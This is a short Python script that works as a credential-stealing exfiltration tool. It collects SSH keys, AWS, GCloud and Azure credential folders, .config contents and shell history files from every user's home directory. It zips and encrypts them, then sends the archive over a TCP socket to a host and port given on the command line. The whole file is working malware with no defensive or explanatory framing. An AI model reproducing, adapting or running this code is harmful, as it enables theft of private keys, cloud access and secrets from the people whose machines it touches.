import os
import sys
import io
import socket
import zipfile
import time
from cryptography.fernet import Fernet

FERNET_KEY = "YOUR_FERNET_KEY"
fernet = Fernet(FERNET_KEY)

TARGET_DIRS = ['.ssh', '.config', '.aws', '.gcloud', '.azure']
HISTORY_SUFFIX = '_history'

def collect_files():
    archive_io = io.BytesIO()
    with zipfile.ZipFile(archive_io, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for user_dir in os.listdir('/home'):
            home_path = os.path.join('/home', user_dir)
            if not os.path.isdir(home_path):
                continue

            for d in TARGET_DIRS:
                full_path = os.path.join(home_path, d)
                if os.path.exists(full_path):
                    for root, _, files in os.walk(full_path):
                        for f in files:
                            fp = os.path.join(root, f)
                            try:
                                with open(fp, 'rb') as fin:
                                    data = fin.read()
                                    zipf.writestr(os.path.relpath(fp, '/home'), data)
                            except Exception:
                                continue

            for root, _, files in os.walk(home_path):
                for f in files:
                    if f.startswith('.') and f.endswith(HISTORY_SUFFIX):
                        fp = os.path.join(root, f)
                        try:
                            with open(fp, 'rb') as fin:
                                data = fin.read()
                                zipf.writestr(os.path.relpath(fp, '/home'), data)
                        except Exception:
                            continue

    return archive_io.getvalue()

def encrypt_data(data):
    return fernet.encrypt(data)

def send_data(host, port, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, int(port)))
        s.sendall(data)

def main():
    if len(sys.argv) != 3:
        return
    host, port = sys.argv[1], sys.argv[2]
    archive = collect_files()
    encrypted = encrypt_data(archive)
    send_data(host, port, encrypted)

if __name__ == '__main__':
    main()
